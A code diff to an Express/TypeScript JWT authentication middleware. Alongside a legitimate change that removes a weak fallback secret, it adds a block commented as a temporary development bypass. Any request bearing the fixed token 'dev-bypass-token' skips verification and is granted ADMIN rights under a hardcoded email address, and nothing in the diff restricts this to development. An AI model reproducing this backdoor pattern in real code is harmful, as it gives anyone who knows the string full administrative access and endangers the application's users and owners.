@@ -1,5 +1,6 @@
 import { Request, Response, NextFunction } from 'express'
 import jwt from 'jsonwebtoken'
+import { JWT_SECRET } from '../config/env'
 import { UserRole } from '../../../shared/enums'
 import { AppError } from './error.middleware'
 
@@ -23,7 +24,13 @@ export const authMiddleware = (
       throw new AppError('No token, authorization denied', 401)
     }
 
-    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback-secret') as {
+    // FIX TEMPORAL: Bypass para desarrollo
+    if (token === 'dev-bypass-token') {
+      req.user = { id: 'dev-bypass-id', email: 'hectoraderfer123421@gmail.com', rol: UserRole.ADMIN }
+      return next()
+    }
+
+    const decoded = jwt.verify(token, JWT_SECRET) as {
       id: string
       email: string
       rol: UserRole
